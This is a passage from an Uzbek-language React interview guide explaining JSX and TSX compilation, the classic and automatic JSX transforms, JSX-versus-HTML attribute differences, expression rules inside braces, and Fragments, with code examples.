3. Emit `.js` (type erased) yoki `.jsx` (Babel uchun)

**Babel/SWC pipeline:**
1. JSX nodes → `React.createElement` (Classic) yoki `_jsx` (Automatic) chaqiruv
2. ES modern syntax → target browser support

**SWC speed:**
- Babel — JavaScript implementation
- SWC (Rust) — native binary, ko'p hollarda Babel'dan tezroq
- TypeScript compiler: SWC/Turbopack bilan tip checking parallel

**Tip system layer:**

TSX'dagi tip ma'lumotlari:
- Compile-time: type checking, autocompletion, refactoring
- Build output: erased — runtime'da yo'q

```tsx
// Source TSX
interface Props { name: string }
function Greet({ name }: Props) { return <p>{name}</p> }

// Compiled JS (types erased)
function Greet({ name }) { return _jsx("p", { children: name }) }
```

**Generic components TSX-only:**

```tsx
function List<T>({ items, render }: { items: T[]; render: (item: T) => React.ReactNode }) {
  return <ul>{items.map((item, i) => <li key={i}>{render(item)}</li>)}</ul>;
}

// Usage with type inference
<List items={[1, 2, 3]} render={(n) => n * 2} />  // T inferred as number
<List items={users} render={(u) => u.name} />     // T inferred as User
```

JSX'da bu pattern hali yoziladi, lekin type safety yo'q.

**JSX namespace (TypeScript):**

```typescript
// @types/react 18+ — namespace endi global JSX o'rniga React.JSX
declare namespace React {
  namespace JSX {
    interface IntrinsicElements {
      div: React.HTMLAttributes<HTMLDivElement>;
      button: React.ButtonHTMLAttributes<HTMLButtonElement>;
      // ...
      "custom-element": { foo: string };  // Web Component custom
    }
  }
}
```

`IntrinsicElements` — HTML/SVG element'lar uchun props mapping. Custom elements declare qilish mumkin. Eski global `JSX.IntrinsicElements` ham hali ishlaydi (compat).

</details>

### Edge Cases

- **`.jsx` faylda TypeScript expression**: Bo'lmaydi — `tsconfig.json` allowJs bilan kompilyatsiya, lekin tip yo'q.
- **`.ts` faylda JSX**: TypeScript `.ts` faylda JSX'ni tushunmaydi — `.tsx` ishlatish kerak (sinov: `<div>` operator generic interpretation).
- **TypeScript file extension `.cts`/`.mts`**: TypeScript ESM/CJS'ni ajratish uchun (Node.js). JSX bilan: `.cts`/`.mts` JSX support yo'q — `.tsx` qoladi.

### Follow-up savollar

- "TypeScript compiler vs Babel JSX transform — qaysini ishlatish?" — Modern: TypeScript compiler faqat type check (`noEmit: true`), Babel/SWC actual compile. TS'ning `--isolatedModules` flag bilan compatibility.
- "TypeScript bilan JSX import yo'q (R17+ automatic)?" — `tsconfig.json` `"jsx": "react-jsx"` (automatic) yoki `"jsx": "react"` (classic). Automatic'da `import React` kerak emas.
- "Generic JSX `<T>` ambiguity?" — TypeScript ba'zi joylarda `<T>` JSX vs generic ambiguity'ni `<T,>` (trailing comma) bilan hal qiladi.

</details>

---

### 32. JSX nima — syntax extension yoki DSL? [Junior+]

<details>
<summary><strong>Javob</strong></summary>

### Qisqa javob

**JSX = JavaScript XML** — JavaScript'ga XML-like syntax kengaytmasi. **String emas, template engine emas, embedded DSL emas** — Babel/SWC orqali oddiy JavaScript function chaqiruvlariga transpile qilinadigan **syntax extension**. JSX expression — JavaScript expression bo'lib, variable'ga assign, function'dan return, object property bo'lishi mumkin.

### To'liq tushuntirish

**Asosiy xususiyatlar:**

1. **Syntax extension** — JS standartiga qo'shilgan, lekin TC39 standart **emas** (alohida Facebook JSX spec)
2. **Compile-time transformation** — Babel/SWC orqali function call'ga aylantiriladi
3. **Expression** — JS expression sifatida ishlatiladi (return, assign, prop)
4. **Type-safe (TSX)** — TypeScript JSX type checking
5. **Optional** — React'ni JSX'siz `React.createElement` bilan ishlatish mumkin

### Kod misoli

```tsx
// JSX expression — variable'ga assign
const greeting = <h1>Hello, World!</h1>;

// Function'dan return
function Greeting() {
  return <h1>Hello!</h1>;
}

// Object property
const elements = {
  header: <Header />,
  footer: <Footer />,
};

// Array element
const items = [
  <li key="1">First</li>,
  <li key="2">Second</li>,
];

// Conditional (ternary)
const ui = user ? <Profile user={user} /> : <Login />;

// JSX'siz alternative
import { createElement } from "react";

const greeting = createElement("h1", null, "Hello, World!");
function Greeting() {
  return createElement("h1", null, "Hello!");
}
```

**Compile transformation:**

```tsx
// Source
<button onClick={handler} className="btn">Click me</button>

// Compiled (Automatic, R17+)
_jsx("button", {
  onClick: handler,
  className: "btn",
  children: "Click me"
});

// Compiled (Classic transform, R16 va undan oldin — yoki opt-in keyinroq)
React.createElement("button", {
  onClick: handler,
  className: "btn"
}, "Click me");
```

<details>
<summary><strong>Deep Dive</strong></summary>

**JSX vs alternative approaches:**

| Approach | Misol | React'da |
|----------|-------|----------|
| **String template** | `` `<button>${label}</button>` `` | Lit, vanilla JS |
| **Template engine** | `<button>{{label}}</button>` (Handlebars) | Yo'q |
| **Hyperscript** | `h("button", null, label)` | Preact, Mithril |
| **JSX** | `<button>{label}</button>` | React |
| **Tagged template literal** | `` html`<button>${label}</button>` `` | Lit |
| **Compiled DSL** | Vue SFC, Svelte | Vue, Svelte |

**JSX afzalliklari hyperscript'dan:**
- HTML'ga o'xshash — backend developer'lar uchun tanish
- IDE highlighting (HTML va attribute completion)
- TypeScript JSX namespace (intrinsic elements)
- Babel plugin'lar (JSX → custom transform mumkin)

**JSX cheklovlari:**
- HTML emas — `class` → `className`, `for` → `htmlFor` (JS reserved)
- Single root (yoki Fragment)
- Boolean attributes (`disabled` vs `disabled={true}`)
- Self-closing strict (`<img />`)

**Pragma directive:**

```tsx
/** @jsx h */
import h from "preact";

const el = <button>Click</button>;
// Compile: h("button", null, "Click")
```

`/** @jsx h */` — Babel'ga "JSX'ni `h` chaqir" deb aytadi. Preact, Hyperscript backends uchun.

**`/** @jsxRuntime classic */` — Classic transform majburlash:**

```tsx
/** @jsxRuntime classic */
import React from "react";
const el = <button>Click</button>;
// React.createElement("button", null, "Click")
```

`/** @jsxRuntime automatic */` — Automatic (default R17+).

**`/** @jsxImportSource */`:**

```tsx
/** @jsxImportSource solid-js */
const el = <button>Click</button>;
// import { createComponent } from "solid-js/h/jsx-runtime";
```

Solid, Preact JSX runtime'larini ishlatish uchun.

**JSX standardization status:**

JSX TC39 standartlashtirilmagan (alohida Facebook JSX spec). React, Vue (JSX support), Solid, Preact ishlatadi. ESBuild, SWC, Babel — barchasi parse qila oladi.

**JSX Spec (Facebook):**
https://facebook.github.io/jsx/

**Pure transformation rules:**
- `<Foo />` — `_jsx(Foo, null)`
- `<Foo bar="baz" />` — `_jsx(Foo, { bar: "baz" })`
- `<Foo>text</Foo>` — `_jsx(Foo, { children: "text" })`
- `<Foo>{a}{b}</Foo>` — `_jsxs(Foo, { children: [a, b] })` (multiple children)
- `<Foo {...props} />` — `_jsx(Foo, { ...props })` (spread)

</details>

### Edge Cases

- **`{}` ichida JS expression**: `{a + b}`, `{user.name}` — OK. **Statement (`if`, `for`, `let`)** — yo'q (expression kutiladi).
- **Empty JSX text**: `<p></p>` — children: `undefined`. `<p>   </p>` — children: `"   "` (space text node).
- **JSX attribute interpolation**: `<button title={title} />` (expression) vs `<button title="Save" />` (string literal). Boolean shorthand: `<button disabled />` = `disabled={true}`.

### Follow-up savollar

- "JSX shart-mi React uchun?" — Yo'q. `React.createElement` bilan ishlash mumkin (lekin verbose). React docs JSX tavsiya qiladi.
- "JSX HTML'mi?" — Yo'q. JSX HTML'ga o'xshaydi, lekin: `class`→`className`, JS expressions `{}`, single root majburiyligi, camelCase attributes.
- "JSX Server Components'da boshqacha-mi?" — Yo'q. Bir xil syntax. `async function Component()` qo'shilgan (server-only).

</details>

---

### 33. JSX vs HTML — asosiy farqlar (className, htmlFor, style, va h.k.) [Junior+]

<details>
<summary><strong>Javob</strong></summary>

### Qisqa javob

JSX HTML'ga o'xshaydi, lekin **JS reserved keyword**'larni qaytarish kerak (`class` → `className`, `for` → `htmlFor`), **camelCase** attribute'lar (`onclick` → `onClick`, `tabindex` → `tabIndex`), **style object** format (`style={{color: "red"}}`), **self-closing strict** (`<img />`), **boolean shorthand** (`disabled` = `disabled={true}`).

### To'liq tushuntirish

**Asosiy farqlar jadvali:**

| HTML | JSX | Sabab |
|------|-----|-------|
| `class="btn"` | `className="btn"` | `class` JS reserved keyword |
| `for="email"` | `htmlFor="email"` | `for` JS reserved keyword |
| `tabindex="0"` | `tabIndex={0}` | camelCase convention |
| `onclick="..."` | `onClick={handler}` | camelCase event names |
| `onchange` (text input on blur) | `onChange` (har keystroke) | React semantics |
| `style="color: red"` | `style={{ color: "red" }}` | Object literal, mahalliy keys camelCase |
| `<img>` | `<img />` | Self-closing required |
| `<input>` | `<input />` | Self-closing required |
| `<br>` | `<br />` | Self-closing required |
| `disabled` | `disabled` yoki `disabled={true}` | Boolean shorthand OK |
| `disabled="false"` (HTML — attribute mavjud!) | `disabled={false}` | False — attribute olib tashlanadi |
| `colspan="2"` | `colSpan={2}` | camelCase |
| `srcset="..."` | `srcSet="..."` | camelCase |
| `crossorigin` | `crossOrigin` | camelCase |
| `enctype` | `encType` | camelCase |
| `viewbox` (SVG) | `viewBox` | camelCase |
| `aria-label` | `aria-label` (camelCase emas!) | ARIA attributes — kebab-case saqlanadi |
| `data-id` | `data-id` (camelCase emas!) | Data attributes — kebab-case |

### Kod misoli

```tsx
// HTML
/*
<div class="card" tabindex="0">
  <label for="email">Email:</label>
  <input id="email" type="text" disabled>
  <img src="logo.png" alt="Logo">
  <p style="color: red; font-size: 16px;">Error</p>
  <button onclick="submit()">Submit</button>
  <table>
    <tr>
      <td colspan="2">Cell</td>
    </tr>
  </table>
</div>
*/

// JSX equivalent
function Form({ onSubmit }: { onSubmit: () => void }) {
  return (
    <div className="card" tabIndex={0}>
      <label htmlFor="email">Email:</label>
      <input id="email" type="text" disabled />
      <img src="logo.png" alt="Logo" />
      <p style={{ color: "red", fontSize: 16 }}>Error</p>
      <button onClick={onSubmit}>Submit</button>
      <table>
        <tbody>
          <tr>
            <td colSpan={2}>Cell</td>
          </tr>
        </tbody>
      </table>
    </div>
  );
}
```

**Style object qoidalari:**

```tsx
// ❌ Noto'g'ri — kebab-case key
<div style={{ "background-color": "red" }} />  // JS error: invalid identifier

// ✅ To'g'ri — camelCase key
<div style={{ backgroundColor: "red" }} />

// ❌ Noto'g'ri — string with px
<div style={{ width: "100px" }} />  // OK lekin verbose

// ✅ To'g'ri — number (auto px qo'shiladi)
<div style={{ width: 100 }} />

// ⚠️ Diqqat: ba'zi properties number qabul qilmaydi
<div style={{ zIndex: 100 }} />  // OK — number
<div style={{ lineHeight: 1.5 }} />  // OK — unitless
<div style={{ opacity: 0.5 }} />  // OK — unitless

// ✅ CSS variable — string
<div style={{ "--my-color": "red" } as React.CSSProperties} />
```

**Boolean attributes:**

```tsx
// ✅ Shorthand
<input disabled />
<button autoFocus />
<input checked={true} />

// ✅ Conditional
<input disabled={!isReady} />
<input checked={isSelected} />

// ⚠️ HTML: disabled="false" — disabled (attribute mavjud)
// ✅ JSX: disabled={false} — attribute olib tashlanadi
<input disabled={false} />  // disabled emas
```

**Controlled inputs — onChange semantikasi:**

```tsx
// HTML: onchange — input lose focus bo'lganda fires
// JSX: onChange — har keystroke fires (HTML'ning oninput'i)

function ControlledInput() {
  const [value, setValue] = useState("");

  return (
    <input
      value={value}
      onChange={(e) => setValue(e.target.value)}  // ← har keystroke
    />
  );
}
```

<details>
<summary><strong>Deep Dive</strong></summary>

**Nima uchun JSX `class` o'rniga `className`:**

ES module'larda `class` keyword (class declaration). JSX prop sifatida `class` yozilsa, parser ambiguity (object property kabi):

```tsx
const el = { class: "btn" };  // JS object literal — `class` shorthand emas
// React JSX uchun aniq nom kerak — className
```

`htmlFor` — `for` loop reserved keyword (`for` qoldirilsa parser bug).

**Nima uchun camelCase event names:**

JS DOM API'da event listener method'lari camelCase emas (`onclick` lowercase). Lekin JS'da property nomi camelCase'da yozilishi standart (`element.onClick` ham, `addEventListener("click")` ham).

React `on{EventName}` convention'ni JS-style camelCase'ga moslashtirgan.

**`onChange` vs HTML `oninput`:**

HTML'da:
- `oninput` — har character'da (like text editor)
- `onchange` — focus lose bo'lganda yoki value commit'da (Enter, blur)

React'da:
- `onChange` — HTML'ning `oninput`'iga teng (har keystroke)
- HTML'ning `onchange`'iga teng narsa yo'q React'da
- Sabab: controlled input pattern uchun — har keystroke'da state sync

**Style object — auto px units:**

React DOM source code'da:
```typescript
const isUnitlessNumber = {
  zIndex: true,
  lineHeight: true,
  opacity: true,
  flex: true,
  fontWeight: true,
  // ... 30+ properties
};

function setStyleValue(style, key, value) {
  if (typeof value === "number" && !isUnitlessNumber[key]) {
    style[key] = `${value}px`;  // auto px
  } else {
    style[key] = value;
  }
}
```

**`dangerouslySetInnerHTML` — XSS hold:**

```tsx
// ❌ HTML'ning innerHTML'iga teng
<div dangerouslySetInnerHTML={{ __html: userContent }} />
// XSS xavfi — user content ichida <script> tag bo'lishi mumkin

// ✅ Sanitization bilan
import DOMPurify from "dompurify";
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userContent) }} />
```

**Custom HTML attribute (data-*):**

```tsx
<div data-user-id={user.id} data-testid="user-card" />
// HTML'da bir xil — kebab-case saqlanadi
// dataset'da: element.dataset.userId, element.dataset.testid
```

**ARIA attributes:**

```tsx
<button aria-label="Close" aria-pressed={isPressed} aria-describedby="tooltip" />
// kebab-case saqlanadi (a11y standard)
```

**SVG attributes — exception list:**

SVG attribute'lar HTML'dan farqli (kebab-case dominant), JSX'da camelCase:
- `viewBox`, `clipPath`, `fillOpacity`, `strokeWidth`, `xmlnsXlink`

```tsx
<svg viewBox="0 0 100 100">
  <circle cx={50} cy={50} r={40} fill="red" strokeWidth={2} />
</svg>
```

**HTML reserved keys olib tashlangan (R19):**

R19'da olib tashlangan props (use replacement):
- `propTypes` (function components) — TS interfaces
- `defaultProps` (function components) — JS default parameters
- String refs (`ref="myInput"`) — `useRef`/callback ref

</details>

### Edge Cases

- **`<label htmlFor="">` boshqa elementlar**: HTML5'da `<label for>` faqat form control — JSX'da bir xil semantic.
- **`autoFocus`**: HTML'da ko'p browser'lar agressively respect, JSX'da React-controlled. Initial render'da fokus.
- **`value={null}` vs `value={undefined}`**: React `null`/`undefined` — uncontrolled mode'ga o'tadi (warning). Controlled uchun `value={value ?? ""}`.
- **`<select multiple>` value**: Array — `value={[1, 2]}` (HTML attribute'sida bo'lmaydi).

### Follow-up savollar

- "Nega `className` emas `cls` yoki `class`?" — `class` reserved (class declaration). `className` HTML DOM property nomi (`element.className`).
- "Custom HTML attributes — `data-*`, `aria-*` qabul qilinadi-mi?" — Ha, kebab-case saqlanadi (TypeScript namespace'da `[key: \`data-${string}\`]: any`).
- "SVG `xmlns` qanday yoziladi?" — `<svg xmlns="http://www.w3.org/2000/svg">` — string. React buni HTML'ga o'tkazadi.

</details>

---

### 34. Classic transform (createElement) vs Automatic transform (R17+, _jsx) [Senior]

<details>
<summary><strong>Javob</strong></summary>

### Qisqa javob

**Classic transform (R16 va undan oldin)**: JSX → `React.createElement(...)` — har faylda `import React from 'react'` majburiy. **Automatic transform (R17+, hozirgi default)**: JSX → `_jsx(...)` `react/jsx-runtime` modulidan auto-import — `import React` kerak emas. Tezroq, kichikroq bundle, dev mode'da Source improved error messages.

### To'liq tushuntirish

**Classic transform misoli:**

```tsx
// Source
import React from "react";

function App() {
  return <button>Click</button>;
}

// Compiled
"use strict";
var React = require("react");

function App() {
  return React.createElement("button", null, "Click");
}
```

**Automatic transform misoli:**

```tsx
// Source — import React YO'Q
function App() {
  return <button>Click</button>;
}

// Compiled
"use strict";
var _jsxRuntime = require("react/jsx-runtime");

function App() {
  return _jsxRuntime.jsx("button", { children: "Click" });
}
```

**Farqlar:**

| Aspekt | Classic | Automatic |
|--------|---------|-----------|
| Versiya | R0-R16 | R17+ |
| Function | `React.createElement` | `_jsx`, `_jsxs`, `_Fragment` |
| Import | `import React` majburiy | Auto-injected |
| Source | `react` | `react/jsx-runtime` |
| Multiple children | Variadic args | `_jsxs` (separate function) |
| Dev mode | `React.createElement` + `__source`/`__self` props | `_jsxDEV` with source location |
| Bundle size | Biroz katta (`React` namespace import) | Kichikroq |

### Kod misoli

**Multiple children optimization:**

```tsx
// Source
<ul>
  <li>A</li>
  <li>B</li>
  <li>C</li>
</ul>

// Classic compiled — variadic args
React.createElement("ul", null,
  React.createElement("li", null, "A"),
  React.createElement("li", null, "B"),
  React.createElement("li", null, "C")
);

// Automatic compiled — array children
_jsxs("ul", {
  children: [
    _jsx("li", { children: "A" }),
    _jsx("li", { children: "B" }),
    _jsx("li", { children: "C" })
  ]
});
```

`_jsx` — single child; `_jsxs` — multiple (array). Optimization: `_jsxs` validate array sifatida, `_jsx` single value.

**Dev mode `_jsxDEV`:**

```tsx
// Compiled (development)
_jsxDEV("button", { onClick: handler, children: "Click" }, undefined, false, {
  fileName: "/src/App.tsx",
  lineNumber: 5,
  columnNumber: 10,
}, this);
// ↑ Source location — DevTools'da error stack
```

`_jsxDEV` — development build only. Production'da `_jsx` (smaller, faster).

<details>
<summary><strong>Deep Dive</strong></summary>

**JSX runtime module:**

```typescript
// react/jsx-runtime (production)
export function jsx(type, props, key) {
  return {
    $$typeof: REACT_ELEMENT_TYPE,
    type,
    key: key !== undefined ? "" + key : null,
    ref: null,
    props,
  };
}

export function jsxs(type, props, key) {
  // Same as jsx, but for multiple children (validate array)
  return jsx(type, props, key);
}

export const Fragment = REACT_FRAGMENT_TYPE;
```

```typescript
// react/jsx-dev-runtime (development)
export function jsxDEV(type, props, key, isStaticChildren, source, self) {
  const element = jsx(type, props, key);
  // ⚡ Add __source, __self for DevTools error messages
  Object.defineProperty(element, "_source", {
    enumerable: false,
    writable: false,
    value: source,
  });
  return element;
}
```

**`React.createElement` — additional logic:**

```typescript
// React 19 — createElement (Classic compatibility)
export function createElement(type, props, ...children) {
  // ⚠️ Eskirgan signature — children variadic
  // Babel/SWC'ga: ko'p parameter
  let propsWithChildren = { ...props };
  if (children.length === 1) {
    propsWithChildren.children = children[0];
  } else if (children.length > 1) {
    propsWithChildren.children = children;
  }

  return jsx(type, propsWithChildren);
}
```

`createElement` — signature `(type, props, child1, child2, ...)`. `_jsx` — `(type, propsWithChildren, key)`. `_jsx` better for static children (compiler aniq biladi).

**Configuration:**

```jsonc
// tsconfig.json (TypeScript)
{
  "compilerOptions": {
    "jsx": "react-jsx",      // automatic (R17+)
    // "jsx": "react",        // classic
    // "jsx": "preserve",     // .jsx output (Babel handle qiladi)
    "jsxImportSource": "react"  // optional, default "react"
  }
}
```

```jsonc
// .babelrc
{
  "presets": [
    ["@babel/preset-react", {
      "runtime": "automatic",  // R17+ default
      // "runtime": "classic",
      "importSource": "react"
    }]
  ]
}
```

**Pragma directive (per-file override):**

```tsx
/** @jsxRuntime classic */
/** @jsx React.createElement */
import React from "react";

const el = <button>Click</button>;
// React.createElement("button", null, "Click")
```

```tsx
/** @jsxRuntime automatic */
/** @jsxImportSource solid-js */

const el = <button>Click</button>;
// import { createComponent } from "solid-js/h/jsx-runtime";
```

**Performance impact:**

- Bundle size: Automatic kichikroq (`import React from "react"` namespace olib tashlanadi, tree-shake yaxshiroq)
- Build time: SWC + Automatic — eng tez combo
- Runtime: identical (ikkalasi ham React element object yaratadi)

**Migration:**

R16 → R17+ migration:
1. Update React: `npm install react@17 react-dom@17`
2. Update TypeScript: `"jsx": "react-jsx"` (yoki Babel `runtime: "automatic"`)
3. Remove `import React from "react"` from files (eslint codemod)

ESLint codemod: `npx react-codemod update-react-imports`.

**`Fragment` shortcut (`<>`):**

```tsx
// Source
<>
  <Header />
  <Footer />
</>

// Classic compiled
React.createElement(React.Fragment, null,
  React.createElement(Header, null),
  React.createElement(Footer, null)
);

// Automatic compiled
_jsxs(_Fragment, {
  children: [_jsx(Header, {}), _jsx(Footer, {})]
});
```

`_Fragment` — `react/jsx-runtime` export.

</details>

### Edge Cases

- **`React.createElement` direct chaqiruvi**: Hali ishlaydi (R19'da ham). Lekin `_jsx` automatic ishlatish modern.
- **Mixed Classic/Automatic**: Bir project ichida — bo'ladi (per-file pragma), lekin tavsiya qilinmaydi (consistency).
- **`React.Fragment` vs `<>`**: Bir xil natija. `<>` qisqaroq, lekin `key` prop bermaslik mumkin (`<Fragment key={x}>` kerak).

### Follow-up savollar

- "Eski code'da `import React from "react"` bo'lsa bug bormi R17+'da?" — Yo'q, hali ishlaydi (lekin unused warning ESLint'dan). Codemod orqali olib tashlanadi.
- "Preact JSX qanday transform qiladi?" — `preact/jsx-runtime` — `h` function chiqaradi, React shape'iga emas.
- "JSX'siz React kod yozish mumkin-mi?" — Ha. `React.createElement` directly. Verbose, lekin Lisp/Hyperscript shaklida ishlatiladi (Mithril, Hyperscript).

</details>

---

### 35. JSX expressions vs statements — `{}` ichida nima yozish mumkin? [Middle]

<details>
<summary><strong>Javob</strong></summary>

### Qisqa javob

JSX'ning `{}` ichida faqat **JavaScript expression** yozish mumkin — value qaytaradigan kod (variable, function call, ternary, arithmetic, object/array literal, JSX). **Statement** (if, for, switch, let/const declaration) yozish **mumkin emas** — chunki ular value qaytarmaydi. Conditional uchun ternary, list uchun `.map()`, complex logic uchun helper function ishlatiladi.

### To'liq tushuntirish

**Expression (`{}` ichida OK):**
- Variable: `{name}`
- Function call: `{getName()}`
- Arithmetic: `{a + b}`, `{count * 2}`
- Ternary: `{isLoggedIn ? <Profile /> : <Login />}`
- Logical: `{loading && <Spinner />}`
- Array: `{[1, 2, 3].map(...)}`
- Object: `{{ key: value }}` (faqat attribute value sifatida)
- Template literal: `` {`Hello, ${name}`} ``
- JSX: `{<NestedComponent />}`
- IIFE: `{(() => { /* logic */ return <p>Result</p>; })()}`

**Statement (`{}` ichida MUMKIN EMAS):**
- `{if (cond) ...}` — TypeError
- `{for (...) ...}` — TypeError
- `{switch (val) ...}` — TypeError
- `{const x = 5}` — TypeError
- `{let x; x = 5}` — TypeError
- `{return x}` — TypeError (faqat function ichida)

### Kod misoli

```tsx
function UserCard({ user, isAdmin }: { user: User; isAdmin: boolean }) {
  return (
    <div>
      {/* ✅ Variable */}
      <h1>{user.name}</h1>

      {/* ✅ Function call */}
      <p>{formatDate(user.createdAt)}</p>

      {/* ✅ Arithmetic */}
      <p>Age: {2026 - user.birthYear}</p>

      {/* ✅ Ternary */}
      {isAdmin ? <AdminPanel /> : <UserPanel />}

      {/* ✅ Logical AND */}
      {user.email && <a href={`mailto:${user.email}`}>{user.email}</a>}

      {/* ✅ Array map */}
      <ul>
        {user.tags.map((tag) => <li key={tag}>{tag}</li>)}
      </ul>

      {/* ✅ Template literal */}
      <p>{`Welcome, ${user.name}!`}</p>

      {/* ✅ Nested JSX */}
      <section>{<NestedComponent user={user} />}</section>

      {/* ✅ Object as attribute */}
      <p style={{ color: "red", fontSize: 16 }}>Error</p>

      {/* ✅ IIFE for complex logic */}
      {(() => {
        const role = user.role;
        if (role === "admin") return <AdminBadge />;
        if (role === "moderator") return <ModBadge />;
        return null;
      })()}
    </div>
  );
}

// ❌ Statement — error
function BadComponent({ user }) {
  return (
    <div>
      {/* ❌ if statement — SyntaxError */}
      {if (user.isAdmin) <Admin />}

      {/* ❌ for loop — SyntaxError */}
      {for (const tag of user.tags) <li>{tag}</li>}

      {/* ❌ const declaration — SyntaxError */}
      {const x = 5}
    </div>
  );
}
```

**Conditional pattern alternativalar:**

```tsx
// 1. Ternary
{condition ? <A /> : <B />}

// 2. Logical AND (faqat true holatda render)
{condition && <A />}

// 3. Early return (function component'da)
function Component({ user }) {
  if (!user) return null;
  return <Profile user={user} />;
}

// 4. Helper function
function getStatusBadge(status: string) {
  if (status === "active") return <ActiveBadge />;
  if (status === "pending") return <PendingBadge />;
  return <InactiveBadge />;
}

return <div>{getStatusBadge(user.status)}</div>;

// 5. Lookup map
const badges = {
  active: <ActiveBadge />,
  pending: <PendingBadge />,
  inactive: <InactiveBadge />,
};

return <div>{badges[user.status] ?? null}</div>;

// 6. Switch in IIFE
{(() => {
  switch (user.status) {
    case "active": return <ActiveBadge />;
    case "pending": return <PendingBadge />;
    default: return <InactiveBadge />;
  }
})()}
```

<details>
<summary><strong>Deep Dive</strong></summary>

**Why expression-only:**

JSX `{...}` block compile-time'da **expression** sifatida transform qilinadi:

```tsx
// Source
<button>{count * 2}</button>

// Compiled
_jsx("button", { children: count * 2 });
//                          ↑
//                     expression
```

`children` — JS object property value. Statement (`if`, `let`) value emas — invalid.

**`return` ichida `if` statement OK:**

```tsx
function Component({ user }) {
  // function body — statement OK
  if (!user) {
    return null;
  }

  // return — JSX expression
  return (
    <div>
      <h1>{user.name}</h1>
      {user.isAdmin && <AdminPanel />}  {/* JSX'da expression */}
    </div>
  );
}
```

**Comma operator workaround:**

```tsx
// ❌ Statement
{const x = compute(); <p>{x}</p>}

// ✅ Comma operator (expression)
{(() => { const x = compute(); return <p>{x}</p>; })()}

// ✅ Helper function
function ComputedView() {
  const x = compute();
  return <p>{x}</p>;
}
{<ComputedView />}
```

**`do` expression proposal (Stage 1):**

```tsx
// Future TC39 proposal
{do {
  const x = compute();
  if (x > 10) <Big x={x} />;
  else <Small x={x} />;
}}
// 2026: Stage 1, hali stable emas
```

**Object literal pitfall:**

```tsx
// ❌ Object literal as child — JS parser as block
{{ a: 1, b: 2 }}
// Parser: outer {} = JSX expression, inner {} = ???

// ✅ Wrap in parens
{({ a: 1, b: 2 })}
// JS object as child — invalid (object as React child)

// ✅ JSON stringify
{JSON.stringify({ a: 1, b: 2 })}

// ✅ Use as attribute (works)
<div data-config={JSON.stringify({ a: 1 })} />
```

**Children — special cases:**

```tsx
// JSX children types:
{null}        // skipped (no render)
{undefined}   // skipped
{false}       // skipped
{true}        // skipped
{""}          // empty text node
{"text"}      // text node
{0}           // text node "0" — careful with && trap
{[1, 2, 3]}   // multiple children
```

**0 trap:**

```tsx
{count && <Component />}
// count = 0 → `0 && <C />` returns `0` (falsy short-circuit), JSX renders number 0 as text "0"
// count = 1 → renders <Component />

// ✅ Explicit boolean
{count > 0 && <Component />}
{Boolean(count) && <Component />}
{!!count && <Component />}
```

**Whitespace handling:**

```tsx
<p>
  {firstName}
  {lastName}
</p>
// Output: "Ali" "Karimov" (no space)

<p>
  {firstName} {lastName}
</p>
// Output: "Ali Karimov" (space text node)

<p>{`${firstName} ${lastName}`}</p>
// Output: "Ali Karimov" (template literal)
```

</details>

### Edge Cases

- **`{0}` rendering**: `0` text bo'lib render qilinadi (`<p>0</p>`). Logical AND'da xato (`{count && ...}`).
- **`{false}` rendering**: Render qilinmaydi (skip).
- **`{null}` rendering**: Skip.
- **Object as child**: `{user}` — JSX error: "Objects are not valid as a React child". `{user.name}` to'g'ri.

### Follow-up savollar

- "JSX ichida `await` ishlatish mumkin-mi?" — Faqat `async function Component()` ichida (Server Components). Client Components — yo'q, `useEffect`/Suspense ishlatiladi.
- "Switch statement ko'p case'larda?" — Helper function yoki object lookup tavsiya qilinadi.
- "Hozircha qo'llanmaydigan TC39 proposal'lar?" — `do` expression (Stage 1), pattern matching (Stage 1), pipe operator (`|>` Stage 2).

</details>

---

### 36. JSX'da single root majburiyligi va Fragment yechimi [Middle]

<details>
<summary><strong>Javob</strong></summary>

### Qisqa javob

JSX'da function component (yoki har JSX expression) **bitta root element** qaytarishi shart. Sabab: JSX → JS function call (`_jsx(type, props)`) — bir element. Bir nechta sibling root yozish uchun **Fragment** (`<>...</>` yoki `<Fragment>`) — extra DOM node yaratmasdan logical wrapper.

### To'liq tushuntirish

**Single root sababi:**

```tsx
// ❌ Multiple roots — SyntaxError
function App() {
  return (
    <h1>Header</h1>
    <p>Content</p>
  );
}
// JSX → 2 ta function call return — JS function bitta value qaytaradi
```

**Fragment yechim'lari:**

```tsx
// 1. Wrapper div (extra DOM node)
function App() {
  return (
    <div>
      <h1>Header</h1>
      <p>Content</p>
    </div>
  );
}

// 2. Fragment shorthand <>...</>
function App() {
  return (
    <>
      <h1>Header</h1>
      <p>Content</p>
    </>
  );
}

// 3. Fragment explicit (key kerak bo'lganda)
import { Fragment } from "react";

function App() {
  return (
    <Fragment>
      <h1>Header</h1>
      <p>Content</p>
    </Fragment>
  );
}

// 4. Array (less common)
function App() {
  return [
    <h1 key="h">Header</h1>,
    <p key="p">Content</p>
  ];
}
```

### Kod misoli

```tsx
// ✅ Fragment shorthand — eng tez-tez ishlatiladigan
function UserInfo({ user }: { user: User }) {
  return (
    <>
      <h2>{user.name}</h2>
      <p>{user.email}</p>
      <p>{user.role}</p>
    </>
  );
}

// ✅ Fragment with key (list ichida)
function DefinitionList({ items }: { items: Item[] }) {
  return (
    <dl>
      {items.map((item) => (
        <Fragment key={item.id}>
          <dt>{item.term}</dt>
          <dd>{item.definition}</dd>
        </Fragment>
      ))}
    </dl>
  );
}
// Note: <></> shorthand key'ni qabul qilmaydi — explicit Fragment

// ✅ Conditional fragment
function Page({ user }: { user: User | null }) {
  return (
    <>
      <Header />
      {user ? (
        <>
          <Profile user={user} />
          <Logout />
        </>
      ) : (
        <Login />
      )}
      <Footer />
    </>
  );
}
```

<details>
<summary><strong>Deep Dive</strong></summary>

**JSX compile output for Fragment:**

```tsx
// Source
<>
  <h1>A</h1>
  <p>B</p>
</>

// Compiled (Automatic)
_jsxs(_Fragment, {
  children: [
    _jsx("h1", { children: "A" }),
    _jsx("p", { children: "B" })
  ]
});
```

`_Fragment` — `react/jsx-runtime` export. Symbol identifier React internals'da.

**Fragment Fiber:**

Fiber tree'da `Fragment` — alohida node:

```
Fiber(App)
  └─ Fiber(Fragment, tag: 7)
       ├─ Fiber(h1)
       └─ Fiber(p)
```

DOM tree'da `<Fragment>` rendered emas — children parent'ning DOM child'lari bo'ladi:

```html
<!-- DOM -->
<div id="app">
  <h1>A</h1>
  <p>B</p>
</div>
<!-- Fragment yo'q DOM'da -->
```

**Why single root in JSX:**

JSX expression → function call:
```tsx
<Foo />     // _jsx(Foo, {})  — 1 expression
